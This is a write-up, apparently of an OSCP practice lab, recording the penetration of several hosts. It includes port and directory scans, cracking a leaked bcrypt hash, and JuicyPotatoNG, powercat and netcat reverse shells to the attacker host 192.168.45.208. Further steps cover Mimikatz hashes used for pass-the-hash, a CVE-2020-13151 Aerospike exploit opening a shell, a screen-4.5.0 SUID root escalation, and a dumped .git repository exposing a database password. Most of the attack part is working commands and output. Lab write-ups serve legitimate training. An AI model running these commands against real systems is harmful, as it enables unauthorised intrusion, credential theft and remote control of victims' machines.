## Overview
![image](https://hackmd.io/_uploads/HyDMw1FLbg.png)

## Nmap(外網)
* 192.168.x.141
```
Nmap scan report for 192.168.115.141
Host is up (0.20s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_8.1 (protocol 2.0)
80/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
81/tcp   open  http          Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MySQL (unauthorized)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|7|2008|8.1 (98%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (98%), Microsoft Windows 10 1909 (91%), Microsoft Windows 10 1903 - 21H1 (90%), Microsoft Windows 10 1709 - 21H2 (90%), Microsoft Windows Server 2019 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows 10 20H2 - 21H1 (88%), Microsoft Windows 10 21H2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
* 192.168.x.143
```
Nmap scan report for 192.168.115.143
Host is up (0.21s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
81/tcp   open  http       Apache httpd 2.4.41 ((Ubuntu))
443/tcp  open  http       Apache httpd 2.4.41
3000/tcp open  ppp?
3001/tcp open  nessus?
3003/tcp open  cgms?
3306/tcp open  mysql      MySQL (unauthorized)
5432/tcp open  postgresql PostgreSQL DB 12.9 - 12.13
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3003-TCP:V=7.95%I=7%D=1/29%Time=697B68A2%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,1,"\n")%r(GetRequest,1,"\n")%r(HTTPOptions,1,"\n")%r(RTSPReq
SF:uest,1,"\n")%r(Help,1,"\n")%r(SSLSessionReq,1,"\n")%r(TerminalServerCoo
SF:kie,1,"\n")%r(Kerberos,1,"\n")%r(FourOhFourRequest,1,"\n")%r(LPDString,
SF:1,"\n")%r(LDAPSearchReq,1,"\n")%r(SIPOptions,1,"\n");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.2 - 4.14 (91%), Android 10 - 12 (Linux 4.14 - 4.19) (91%), Linux 2.6.32 - 3.10 (91%), Linux 5.0 - 5.14 (91%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (91%), Linux 4.19 (90%), Linux 5.0 (90%), OpenWrt 21.02 (Linux 5.4) (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: 127.0.0.2; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
* 192.168.x.144
```
Nmap scan report for 192.168.115.144
Host is up (0.23s latency).
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

* 192.168.x.145
```
PORT     STATE SERVICE       REASON          VERSION
21/tcp   open  ftp           syn-ack ttl 125 Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http          syn-ack ttl 125 Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Samuel's Personal Site
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
135/tcp  open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 125
1978/tcp open  unisql?       syn-ack ttl 125
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
|_    system windows 6.2
3389/tcp open  ms-wbt-server syn-ack ttl 125 Microsoft Terminal Services
| ssl-cert: Subject: commonName=oscp
| Issuer: commonName=oscp
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-01-29T23:12:24
| Not valid after:  2026-07-31T23:12:24
| MD5:   e4a8:2b5c:36fc:5e55:d1fe:24b1:2690:bf4e
| SHA-1: 415f:78e8:1fb7:dce3:3c28:8d8d:c453:b6cf:f4cf:505c
| -----BEGIN CERTIFICATE-----
| MIICzDCCAbSgAwIBAgIQflGyHvxW8I9GZ0rQqxuD9DANBgkqhkiG9w0BAQsFADAP
| MQ0wCwYDVQQDEwRvc2NwMB4XDTI2MDEyOTIzMTIyNFoXDTI2MDczMTIzMTIyNFow
| DzENMAsGA1UEAxMEb3NjcDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEB
| AM1cHp6aKGP/MhD6iDDXqiFeCEtC+LTdpkfRJBmshvC3Z9P5sEg8bPQv1RDWZfqi
| NgQ3EnwNCKWDmLvAlhSduRHvILA8taWIEWNhHBRwHKWUKExJtbasK3OIX2KNeVI9
| aqutGXPQL71yg2D13sBtcWO51vbRf6AZ5HFdkBWgNTCIv6kyFfCcxCRfnwgK6IrU
| 5tx77wcZhcxPPoGXC4t9TASPieiVaTaYF885xqFqnaObKNljk3HJtxfwwINvMc33
| 3qxCODh6XgTL2nyHlG1akTxHGThMRk7jJwsvqnnrnbg9bzMHJXEL92zS4TggIx7h
| njEevE+sYJiIVpWwa85GBeECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEw
| CwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQAB7sbExkqvmV4N8E9kW7gg
| wLePTrg2vtz2tt961Wq7O/88+nLSJ2OBTfpY14FyqAZNF0yYXz8atjJJG3YaG0kR
| 07JPJoAJu9verLL8P5uRHHBWhOGhIH3DAuK72GpuX8rlkv1y2ftKY5w1CXVIZ+CK
| tNA6Kf9vhwyoBKjevthKtVS5pQDEzTDsDrfrveaeVyq5z6EdlO8KRqBcf1K2rG5P
| SdsBvZGJPmL9F4/oPCFIFnkJh7zm9qKqlT23N9erjMfjo/cGF/WJZ4bmafm5zA4t
| yHvpVMvzcLD9Pi6iORPv5WpKS8rqOVPdpOgVgWyVCEkerWzoUdKHr5C+1QdwGhir
|_-----END CERTIFICATE-----
|_ssl-date: 2026-02-02T15:15:13+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: OSCP
|   NetBIOS_Domain_Name: OSCP
|   NetBIOS_Computer_Name: OSCP
|   DNS_Domain_Name: oscp
|   DNS_Computer_Name: oscp
|   Product_Version: 10.0.19041
|_  System_Time: 2026-02-02T15:14:33+00:00
```

* 192.168.x.254
```
Nmap scan report for 192.168.115.254
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE    SERVICE    VERSION
22/tcp filtered ssh
53/tcp open     tcpwrapped
Device type: general purpose|router
Running: Linux 5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

## 192.168.x.141
* 80
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.141]
└─$ dirsearch -u http://192.168.130.141
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/Pen200/OSCP_A/192.168.x.141/reports/http_192.168.130.141/_26-02-04_07-47-53.txt

Target: http://192.168.130.141/

[07:47:53] Starting: 
[07:47:54] 403 -  290B  - /%C0%AE%C0%AE%C0%AF                               
[07:47:54] 403 -  290B  - /%3f/                                             
[07:47:55] 403 -  290B  - /%ff                                              
[07:47:57] 403 -  290B  - /.ht_wsr.txt                                      
[07:47:57] 403 -  290B  - /.htaccess.bak1                                   
[07:47:57] 403 -  290B  - /.htaccess.orig                                   
[07:47:57] 403 -  290B  - /.htaccess.sample
[07:47:57] 403 -  290B  - /.htaccess.save
[07:47:57] 403 -  290B  - /.htaccess_extra                                  
[07:47:57] 403 -  290B  - /.htaccess_orig
[07:47:57] 403 -  290B  - /.htaccessBAK
[07:47:57] 403 -  290B  - /.htaccess_sc
[07:47:57] 403 -  290B  - /.htaccessOLD
[07:47:57] 403 -  290B  - /.htm                                             
[07:47:57] 403 -  290B  - /.html                                            
[07:47:57] 403 -  290B  - /.htaccessOLD2
[07:47:57] 403 -  290B  - /.htpasswd_test                                   
[07:47:57] 403 -  290B  - /.httr-oauth                                      
[07:47:57] 403 -  290B  - /.htpasswds                                       
[07:48:07] 403 -  290B  - /adminer/                                         
[07:48:07] 403 -  290B  - /adminer/adminer.php
[07:48:07] 403 -  290B  - /adminer/index.php                                
[07:48:12] 301 -  327B  - /blog  ->  http://192.168.130.141/blog/           
[07:48:12] 200 -    2KB - /blog/
[07:48:12] 403 -  290B  - /cgi-bin/                                         
[07:48:13] 500 -  633B  - /cgi-bin/printenv.pl                              
[07:48:20] 200 -   31KB - /home                                             
[07:48:20] 200 -   36KB - /home.html                                        
[07:48:20] 301 -  329B  - /images  ->  http://192.168.130.141/images/       
[07:48:20] 200 -    6KB - /images/                                          
[07:48:21] 403 -  290B  - /index.php::$DATA                                 
[07:48:29] 403 -  290B  - /phpmyadmin                                       
[07:48:30] 403 -  290B  - /phpmyadmin/                                      
[07:48:30] 403 -  290B  - /phpmyadmin/ChangeLog                             
[07:48:30] 403 -  290B  - /phpmyadmin/doc/html/index.html
[07:48:30] 403 -  290B  - /phpmyadmin/phpmyadmin/index.php
[07:48:30] 403 -  290B  - /phpmyadmin/README
[07:48:30] 403 -  290B  - /phpmyadmin/docs/html/index.html                  
[07:48:30] 403 -  290B  - /phpmyadmin/scripts/setup.php                     
[07:48:30] 403 -  290B  - /phpmyadmin/index.php
[07:48:30] 403 -  290B  - /phpsysinfo/                                      
[07:48:33] 301 -  329B  - /script  ->  http://192.168.130.141/script/       
[07:48:33] 200 -    1KB - /script/                                          
[07:48:38] 403 -  290B  - /Trace.axd::$DATA                                 
[07:48:41] 403 -  290B  - /web.config::$DATA                                
                                                                             
Task Completed
```

* 81
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.145]
└─$ dirsearch -u http://192.168.125.141:81
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/Pen200/OSCP_A/192.168.x.145/reports/http_192.168.125.141_81/_26-02-03_09-23-56.txt

Target: http://192.168.125.141:81/

[09:23:56] Starting: 
[09:24:06] 301 -  331B  - /ADMIN  ->  http://192.168.125.141:81/ADMIN/      
[09:24:06] 301 -  331B  - /Admin  ->  http://192.168.125.141:81/Admin/
[09:24:06] 301 -  331B  - /admin  ->  http://192.168.125.141:81/admin/
[09:24:06] 200 -    8KB - /admin%20/                                        
[09:24:06] 301 -  332B  - /admin.  ->  http://192.168.125.141:81/admin./    
[09:24:06] 200 -    8KB - /Admin/                                           
[09:24:06] 200 -    8KB - /admin/
[09:24:06] 302 -   43KB - /admin/home.php  ->  index.php                    
[09:24:06] 302 -   43KB - /admin/home  ->  index.php                        
[09:24:06] 200 -    8KB - /admin/index
[09:24:06] 200 -    8KB - /admin/index.php                                  
[09:24:07] 302 -    0B  - /admin/login.php  ->  index.php                   
[09:24:07] 302 -    0B  - /admin/login  ->  index.php                       
[09:24:07] 302 -    0B  - /Admin/login/  ->  index.php                      
[09:24:09] 403 -  290B  - /adminer/                                         
[09:24:09] 403 -  290B  - /adminer/adminer.php                              
[09:24:09] 403 -  290B  - /adminer/index.php                                
[09:24:13] 301 -  342B  - /bower_components  ->  http://192.168.125.141:81/bower_components/
[09:24:13] 200 -    7KB - /bower_components/                                
[09:24:13] 301 -  331B  - /build  ->  http://192.168.125.141:81/build/      
[09:24:13] 301 -  331B  - /Build  ->  http://192.168.125.141:81/Build/      
[09:24:13] 200 -    2KB - /build/                                           
[09:24:14] 403 -  290B  - /cgi-bin/                                         
[09:24:14] 500 -  633B  - /cgi-bin/printenv.pl                              
[09:24:16] 301 -  328B  - /DB  ->  http://192.168.125.141:81/DB/            
[09:24:16] 301 -  328B  - /db  ->  http://192.168.125.141:81/db/
[09:24:16] 200 -  969B  - /db/                                              
[09:24:17] 301 -  330B  - /dist  ->  http://192.168.125.141:81/dist/        
[09:24:17] 200 -    1KB - /dist/                                            
[09:24:20] 200 -    1KB - /header                                           
[09:24:20] 200 -    1KB - /header.php                                       
[09:24:21] 200 -    1KB - /images/                                          
[09:24:21] 301 -  332B  - /images  ->  http://192.168.125.141:81/images/                                     
[09:24:30] 301 -  333B  - /plugins  ->  http://192.168.125.141:81/plugins/  
[09:24:30] 200 -    2KB - /plugins/                                         
[09:24:33] 200 -  269B  - /scripts                                          
[09:24:33] 200 -  269B  - /scripts/ckeditor/ckfinder/core/connector/aspx/connector.aspx
[09:24:33] 200 -  269B  - /scripts/convert.bas
[09:24:33] 200 -  269B  - /scripts/root.exe?/c+dir
[09:24:33] 200 -  269B  - /scripts/no-such-file.pl                          
[09:24:33] 200 -  269B  - /scripts/samples/search/webhits.exe
[09:24:33] 200 -  269B  - /scripts/setup.php
[09:24:33] 200 -  269B  - /scripts/ckeditor/ckfinder/core/connector/asp/connector.asp
[09:24:33] 200 -  269B  - /scripts/tinymce
[09:24:33] 200 -  269B  - /scripts/
[09:24:33] 200 -  269B  - /scripts/cgimail.exe
[09:24:33] 200 -  269B  - /scripts/tools/newdsn.exe
[09:24:33] 200 -  269B  - /scripts/ckeditor/ckfinder/core/connector/php/connector.php
[09:24:33] 200 -  269B  - /scripts/counter.exe
[09:24:33] 200 -  269B  - /scripts/samples/
[09:24:33] 200 -  269B  - /scripts/iisadmin/ism.dll?http/dir
[09:24:33] 200 -  269B  - /scripts/tiny_mce
[09:24:33] 200 -  269B  - /scripts/fpcount.exe
[09:24:33] 200 -  269B  - /scripts/tools/getdrvs.exe
```

1. `http://192.168.125.141:81/db/apsystem.sql`
    
    ```
    -- Dumping data for table `admin`
    --

    INSERT INTO `admin` (`id`, `username`, `password`, `firstname`, `lastname`, `photo`, `created_on`) VALUES
    (1, 'nurhodelta', '$2y$10$fCOiMky4n5hCJx3cpsG20Od4wHtlkCLKmO6VLobJNRIg9ooHTkgjK', 'Neovic', 'Devierte', 'facebook-profile-image.jpeg', '2018-04-30');
    ```
    ```
    ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.141]
	└─$ john --wordlist=/usr/share/wordlists/rockyou.txt userShadow         
	Using default input encoding: UTF-8
	Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
	Cost 1 (iteration count) is 1024 for all loaded hashes
	Will run 8 OpenMP threads
	Press 'q' or Ctrl-C to abort, almost any other key for status
	password         (nurhodelta)     
	1g 0:00:00:00 DONE (2026-02-03 09:52) 7.692g/s 553.8p/s 553.8c/s 553.8C/s 123456..666666
	Use the "--show" option to display all of the cracked passwords reliably
	Session completed. 
    ```
    
* Initial Credential
![image](https://hackmd.io/_uploads/HJoVRZzvZg.png)



* Privilege Escalation
    1. Writable Folders
    ```
    Searching executable files in non-default folders with write (equivalent) permissions (can be slow)
         File Permissions "C:\Users\eric.wallows\Documents\agent.exe": eric.wallows [Allow: AllAccess]
         File Permissions "C:\Users\eric.wallows\Documents\winPEASx64.exe": eric.wallows [Allow: AllAccess]
         File Permissions "C:\wamp64\www\Script\GPO.ps1": Authenticated Users [Allow: WriteData/CreateFiles]
         File Permissions "C:\wamp64\attendance\bower_components\bootstrap\nuget\MyGet.ps1": Authenticated Users [Allow: WriteData/CreateFiles]
         File Permissions "C:\wamp64\attendance\bower_components\bootstrap-datepicker\docs\make.bat": Authenticated Users [Allow: WriteData/CreateFiles]
         File Permissions "C:\wamp64\quit_wampserver.bat": Authenticated Users [Allow: WriteData/CreateFiles]
         File Permissions "C:\wamp64\restart_wampserver.bat": Authenticated Users [Allow: WriteData/CreateFiles]
         File Permissions "C:\wamp64\unins000.exe": Authenticated Users [Allow: WriteData/CreateFiles]
         File Permissions "C:\wamp64\uninstall_services.bat": Authenticated Users [Allow: WriteData/CreateFiles]
         File Permissions "C:\wamp64\wampmanager.exe": Authenticated Users [Allow: WriteData/CreateFiles]
    ```
    ![image](https://hackmd.io/_uploads/r1_UQTlwbl.png)
    ![image](https://hackmd.io/_uploads/SyjmE6lw-e.png)
    ![image](https://hackmd.io/_uploads/rJbv4pgPWe.png)
    
    2. SeImpersonatePrivilege
    `C:\wamp64\www\Script\JuicyPotatoNG.exe -t * -p "C:\wamp64\www\Script\nc.exe" -a "192.168.45.208 4444 -e powershell"`
    ```
    *Evil-WinRM* PS C:\wamp64\www\Script> curl http://192.168.45.208/JuicyPotatoNG.exe -o JuicyPotatoNG.exe
    *Evil-WinRM* PS C:\wamp64\www\Script> curl http://192.168.45.208/powercat.ps1 -o powercat.ps1
    *Evil-WinRM* PS C:\wamp64\www\Script> ./powercat.ps1 -c 192.168.45.208 -p 4444
    *Evil-WinRM* PS C:\wamp64\www\Script> ./powercat.ps1 -c 192.168.45.208 -p 4444 -e powershell
    *Evil-WinRM* PS C:\wamp64\www\Script> curl http://192.168.45.208/nc64.exe -o nc.exe
    ```
    ```
    ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A]
    └─$ nc -lvnp 4444
	listening on [any] 4444 ...
	connect to [192.168.45.208] from (UNKNOWN) [192.168.130.141] 54499
	Windows PowerShell
	Copyright (C) Microsoft Corporation. All rights reserved.

	Try the new cross-platform PowerShell https://aka.ms/pscore6

	PS C:\> whoami
    whoami
	nt authority\system
    PS C:\> 
    ```

* Mimikatz
`9a3121977ee93af56ebd0ef4f527a35e`
![image](https://hackmd.io/_uploads/B1h1cTxDWe.png)
`e728ecbadfb02f51ce8eed753f3ff3fd`
![image](https://hackmd.io/_uploads/HJq1oaxwWe.png)
```
┌──(kali㉿kali)-[/usr/share/windows-resources/mimikatz]
└─$ nxc winrm 10.10.90.0/24 -u celia.almeda -H e728ecbadfb02f51ce8eed753f3ff3fd         
WINRM       10.10.90.140    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:oscp.exam) 
WINRM       10.10.90.141    5985   MS01             [*] Windows 10 / Server 2019 Build 19041 (name:MS01) (domain:oscp.exam) 
WINRM       10.10.90.142    5985   MS02             [*] Windows 10 / Server 2019 Build 19041 (name:MS02) (domain:oscp.exam) 
WINRM       10.10.90.140    5985   DC01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
WINRM       10.10.90.141    5985   MS01             [-] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd
WINRM       10.10.90.142    5985   MS02             [+] oscp.exam\celia.almeda:e728ecbadfb02f51ce8eed753f3ff3fd (Pwn3d!)
Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

## 192.168.x.143
* 3003
![image](https://hackmd.io/_uploads/SynllmC8-g.png)
![image](https://hackmd.io/_uploads/H1Ik-X08bx.png)
![image](https://hackmd.io/_uploads/BJLIZXC8Zx.png)
![image](https://hackmd.io/_uploads/BkeH-QCLZx.png)
    * CVE-2020-13151
    Failed for port 4444, guessing its been blocked, attempt to 80 port
    ```
    ┌──(.venv)─(kali㉿kali)-[~/…/Pen200/OSCP_A/192.168.x.143/CVE-2020-13151]
	└─$ python3 cve2020-13151.py --ahost 192.168.121.143 --lhost=192.168.45.175 --lport=4444 --netcatshell                                      
	[+] aerospike build info: 5.1.0.1
	
	[+] looks vulnerable
	[+] populating dummy table.
	[+] writing to test.cve202013151
	[+] wrote gEDqPfvAYpEWKQAS
	[+] registering udf
	[+] sending payload, make sure you have a listener on 192.168.45.175:4444.....
	
	                                                                                                                                                                                  
	┌──(.venv)─(kali㉿kali)-[~/…/Pen200/OSCP_A/192.168.x.143/CVE-2020-13151]
	└─$ python3 cve2020-13151.py --ahost 192.168.121.143 --lhost=192.168.45.175 --lport=4444 --pythonshell
	[+] aerospike build info: 5.1.0.1
	
	[+] looks vulnerable
	[+] populating dummy table.
	[+] writing to test.cve202013151
	[+] wrote fOrauHNHWnFIFVrF
	[+] registering udf
	[+] sending payload, make sure you have a listener on 192.168.45.175:4444.....
	[-] UDF execution returned Client timeout: socket=30000 total=1000 iterations=1 lastNode=192.168.121.143:3000
    ```
    ```
    ┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.143]
	└─$ sudo nc -lvnp 80
	listening on [any] 80 ...
	connect to [192.168.45.175] from (UNKNOWN) [192.168.121.143] 47950
	/bin/sh: 0: can't access tty; job control turned off
	$ whoami
	aero
	$ whoami /priv
	whoami: extra operand ‘/priv’
	Try 'whoami --help' for more information.
	$ id
	uid=1000(aero) gid=1000(aero) groups=1000(aero)
    ```
    
* Privilege Escalation
	1. `SUID`
	https://github.com/YasserREED/screen-v4.5.0-priv-escalate
	```
	-rwsr-xr-x 1 root root 1.8M May 10  2021 /usr/bin/screen-4.5.0 (Unknown SUID binary!)
	```
	![image](https://hackmd.io/_uploads/BJaOGNRIbe.png)
	```
	aero@oscp:/etc$ /tmp/rootshell
	/tmp/rootshell
	# 
	
	# id
	id
	uid=0(root) gid=0(root) groups=0(root)
	# 
	```
	
## 192.168.x.144
* ftp anonymous login
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.144]
└─$ nxc ftp 192.168.121.144 -u '' -p ''                                               
FTP         192.168.121.144 21     192.168.121.144  [-] : (Response:530 Login incorrect.)

┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.144]
└─$ nxc ftp 192.168.121.144 -u anonymous -p anonymous
FTP         192.168.121.144 21     192.168.121.144  [-] anonymous:anonymous (Response:530 Login incorrect.)
```

* http
```
┌──(kali㉿kali)-[~/Desktop/Pen200/OSCP_A/192.168.x.144]
└─$ dirsearch -u http://192.168.121.144
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/Pen200/OSCP_A/192.168.x.144/reports/http_192.168.121.144/_26-02-02_09-41-14.txt

Target: http://192.168.121.144/

[09:41:14] Starting: 
[09:41:20] 301 -  317B  - /.git  ->  http://192.168.121.144/.git/           
[09:41:20] 200 -  413B  - /.git/branches/                                   
[09:41:20] 200 -   16B  - /.git/COMMIT_EDITMSG
[09:41:20] 200 -   21B  - /.git/HEAD
[09:41:20] 200 -  306B  - /.git/config
[09:41:20] 200 -  675B  - /.git/hooks/                                      
[09:41:20] 200 -   73B  - /.git/description                                 
[09:41:20] 200 -  709B  - /.git/
[09:41:21] 200 -  730B  - /.git/index                                       
[09:41:21] 200 -  460B  - /.git/info/                                       
[09:41:21] 200 -  240B  - /.git/info/exclude                                
[09:41:21] 200 -  482B  - /.git/logs/
[09:41:21] 200 -  335B  - /.git/logs/HEAD
[09:41:21] 301 -  327B  - /.git/logs/refs  ->  http://192.168.121.144/.git/logs/refs/
[09:41:21] 301 -  333B  - /.git/logs/refs/heads  ->  http://192.168.121.144/.git/logs/refs/heads/
[09:41:21] 301 -  335B  - /.git/logs/refs/remotes  ->  http://192.168.121.144/.git/logs/refs/remotes/
[09:41:21] 301 -  342B  - /.git/logs/refs/remotes/origin  ->  http://192.168.121.144/.git/logs/refs/remotes/origin/
[09:41:21] 200 -  184B  - /.git/logs/refs/remotes/origin/HEAD               
[09:41:21] 301 -  328B  - /.git/refs/heads  ->  http://192.168.121.144/.git/refs/heads/
[09:41:21] 200 -  112B  - /.git/packed-refs
[09:41:21] 200 -  496B  - /.git/objects/                                    
[09:41:21] 200 -  474B  - /.git/refs/
[09:41:21] 301 -  330B  - /.git/refs/remotes  ->  http://192.168.121.144/.git/refs/remotes/
[09:41:21] 301 -  337B  - /.git/refs/remotes/origin  ->  http://192.168.121.144/.git/refs/remotes/origin/
[09:41:21] 301 -  327B  - /.git/refs/tags  ->  http://192.168.121.144/.git/refs/tags/
[09:41:21] 200 -   30B  - /.git/refs/remotes/origin/HEAD
[09:41:22] 403 -  280B  - /.ht_wsr.txt                                      
[09:41:22] 403 -  280B  - /.htaccess.bak1                                   
[09:41:22] 403 -  280B  - /.htaccess.orig                                   
[09:41:22] 403 -  280B  - /.htaccess.save
[09:41:22] 403 -  280B  - /.htaccess.sample                                 
[09:41:22] 403 -  280B  - /.htaccess_sc
[09:41:22] 403 -  280B  - /.htaccessBAK
[09:41:22] 403 -  280B  - /.htaccess_orig
[09:41:22] 403 -  280B  - /.htaccess_extra                                  
[09:41:22] 403 -  280B  - /.htaccessOLD2
[09:41:22] 403 -  280B  - /.htaccessOLD
[09:41:22] 403 -  280B  - /.html                                            
[09:41:22] 403 -  280B  - /.htm
[09:41:22] 403 -  280B  - /.htpasswds                                       
[09:41:22] 403 -  280B  - /.httr-oauth
[09:41:22] 403 -  280B  - /.htpasswd_test
[09:41:59] 301 -  316B  - /cms  ->  http://192.168.121.144/cms/             
[09:41:59] 200 -    1KB - /cms/                                             
[09:42:15] 301 -  319B  - /images  ->  http://192.168.121.144/images/       
[09:42:15] 200 -  853B  - /images/
[09:42:41] 403 -  280B  - /server-status                                    
[09:42:41] 403 -  280B  - /server-status/
                                                                             
Task Completed
```
```
┌──(.venv)─(kali㉿kali)-[~/…/Pen200/OSCP_A/192.168.x.144/git]
└─$ git-dumper http://192.168.178.144/.git/ ./git
[-] Testing http://192.168.178.144/.git/HEAD [200]
[-] Testing http://192.168.178.144/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://192.168.178.144/.gitignore [404]
[-] http://192.168.178.144/.gitignore responded with status code 404
[-] Fetching http://192.168.178.144/.git/ [200]
[-] Fetching http://192.168.178.144/.git/index [200]
[-] Fetching http://192.168.178.144/.git/api/ [200]
[-] Fetching http://192.168.178.144/.git/COMMIT_EDITMSG [200]
Task .git/api/ raised exception:
[-] Fetching http://192.168.178.144/.git/README.md [200]
Traceback (most recent call last):
[-] Fetching http://192.168.178.144/.git/branches/ [200]
[-] Fetching http://192.168.178.144/.git/HEAD [200]
[-] Fetching http://192.168.178.144/.git/description [200]
[-] Fetching http://192.168.178.144/.git/hooks/ [200]
[-] Fetching http://192.168.178.144/.git/config [200]
```
```
┌──(.venv)─(kali㉿kali)-[~/…/Pen200/OSCP_A/192.168.x.144/git]
└─$ git log -p -1
commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
Author: Stuart <luke@challenge.pwk>
Date:   Fri Nov 18 16:58:34 2022 -0500

    Security Update

diff --git a/configuration/database.php b/configuration/database.php
index 55b1645..8ad08b0 100644
--- a/configuration/database.php
+++ b/configuration/database.php
@@ -2,8 +2,9 @@
 class Database{
     private $host = "localhost";
     private $db_name = "staff";
-    private $username = "stuart@challenge.lab";
-    private $password = "BreakingBad92";
+    private $username = "";
+    private $password = "";
